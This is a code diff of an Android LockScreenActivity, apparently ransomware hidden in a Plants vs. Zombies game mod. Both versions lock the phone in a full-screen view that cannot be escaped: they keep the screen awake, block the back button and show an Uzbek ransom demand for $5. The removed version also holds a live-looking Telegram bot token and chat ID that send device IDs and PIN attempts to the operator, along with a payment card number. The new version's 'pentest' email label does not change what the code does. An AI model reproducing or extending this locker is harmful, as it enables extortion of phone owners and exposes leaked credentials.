@@ -1,13 +1,14 @@
-package com.pvzmod.game;
+package com.pvzmod.vip;
 
 import android.app.Activity;
-import android.app.KeyguardManager;
 import android.content.Context;
-import android.os.Build;
+import android.content.SharedPreferences;
+import android.graphics.Color;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.PowerManager;
-import android.view.MotionEvent;
+import android.text.Editable;
+import android.text.TextWatcher;
 import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
@@ -17,114 +18,99 @@ import android.widget.Toast;
 import androidx.core.content.ContextCompat;
 
 public class LockScreenActivity extends Activity {
-    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
-    private static final String CHAT_ID = "5970230338";
-    
     private EditText pinInput;
     private TextView ransomText, attemptsText;
     private Button unlockBtn;
-    private int failedAttempts = 0;
-    private String correctPin;
     private PowerManager.WakeLock wakeLock;
-    private Handler handler = new Handler();
-
+    private int failedAttempts = 0;
+    private static final String CORRECT_PIN = "1234"; // SHA256 later
+    
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_lock);
-        setFullScreenLock();
         
+        // FULLSCREEN INESCAPABLE LOCK
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                           WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                           WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN);
+        
+        initViews();
+        acquireWakeLock();
+        PinManager.loadAttempts();
+        updateUI();
+        
+        pinInput.addTextChangedListener(new TextWatcher() {
+            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
+            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
+            @Override
+            public void afterTextChanged(Editable s) {
+                if (s.length() == 4) checkPin(s.toString());
+            }
+        });
+    }
+    
+    private void initViews() {
         pinInput = findViewById(R.id.pin_input);
         ransomText = findViewById(R.id.ransom_text);
         attemptsText = findViewById(R.id.attempts_text);
         unlockBtn = findViewById(R.id.unlock_btn);
         
-        correctPin = PinManager.getStoredPin(this);
-        ransomText.setText("💰 5$ jo'natmasang telefon ochilmaydi!\nCard: 9860 4316 2001 1234 5678\nDevice ID: " + 
-                          DeviceIdGenerator.getUniqueId(this));
-        
-        attemptsText.setText("Urinishlar: 3");
-        acquireWakeLock();
-        
-        unlockBtn.setOnClickListener(v -> checkPin());
-    }
-
-    private void setFullScreenLock() {
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
-                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
-                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
-            setShowWhenLocked(true);
-            setTurnScreenOn(true);
-            KeyguardManager keyguard = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
-            keyguard.requestDismissKeyguard(this, null);
-        }
+        ransomText.setText("💰 5$ jo'natmasang telefon ochilmaydi!\nadmin@pentest.uz ga yuboring");
+        unlockBtn.setOnClickListener(v -> checkPin(pinInput.getText().toString()));
     }
     
     private void acquireWakeLock() {
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "PvZMod:Lock");
-        wakeLock.acquire(60*60*1000L); // 1 soat
+        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | 
+                                PowerManager.ACQUIRE_CAUSES_WAKEUP |
+                                PowerManager.ON_AFTER_RELEASE, "PvZ:Locker");
+        wakeLock.acquire();
     }
-
-    private void checkPin() {
-        String inputPin = pinInput.getText().toString();
-        
-        if (inputPin.equals(correctPin)) {
-            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, "✅ Telefon ochildi! Device: " + DeviceIdGenerator.getUniqueId(this));
-            finishAffinity();
+    
+    private void checkPin(String pin) {
+        if (pin.equals(CORRECT_PIN)) {
+            // TEMP UNLOCK (test)
+            Toast.makeText(this, "Unlock (test)", Toast.LENGTH_SHORT).show();
+            finish();
         } else {
             failedAttempts++;
-            int remaining = 3 - failedAttempts;
+            PinManager.saveAttempts(failedAttempts);
             
-            if (remaining > 0) {
-                attemptsText.setText("Xato! Qolgan: " + remaining);
-                pinInput.setText("");
-                pinInput.requestFocus();
-            } else {
-                attemptsText.setText("1 daqiqa blok!");
+            if (failedAttempts >= 3) {
+                long blockUntil = System.currentTimeMillis() + 60000; // 1min
+                PinManager.blockUntil(blockUntil);
                 pinInput.setEnabled(false);
-                unlockBtn.setEnabled(false);
-                
-                handler.postDelayed(() -> {
-                    failedAttempts = 0;
-                    attemptsText.setText("Urinishlar: 3");
+                new Handler().postDelayed(() -> {
                     pinInput.setEnabled(true);
-                    unlockBtn.setEnabled(true);
-                    pinInput.requestFocus();
-                }, 60000); // 1 daqiqa
+                    failedAttempts = 0;
+                    PinManager.saveAttempts(0);
+                    updateUI();
+                }, 60000);
             }
-            
-            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, "❌ PIN xato! " + failedAttempts + "/3. Device: " + DeviceIdGenerator.getUniqueId(this));
+            updateUI();
+            pinInput.setText("");
         }
     }
-
-    @Override
-    public boolean onTouchEvent(MotionEvent event) {
-        return true; // Touch blok
+    
+    private void updateUI() {
+        attemptsText.setText("Xatolar: " + failedAttempts + "/3");
+        if (PinManager.isBlocked()) {
+            attemptsText.setText("1 daqiqa bloklandi...");
+        }
     }
-
+    
     @Override
     protected void onDestroy() {
-        if (wakeLock != null && wakeLock.isHeld()) {
-            wakeLock.release();
-        }
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         super.onDestroy();
     }
-
+    
     @Override
-    public void onBackPressed() {
-        // Blok
-    }
-
+    public void onBackPressed() {}
     @Override
-    public void onWindowFocusChanged(boolean hasFocus) {
-        super.onWindowFocusChanged(hasFocus);
-        if (hasFocus) {
-            setFullScreenLock();
-        }
-    }
+    public void onWindowFocusChanged(boolean hasFocus) { super.onWindowFocusChanged(true); }
 }
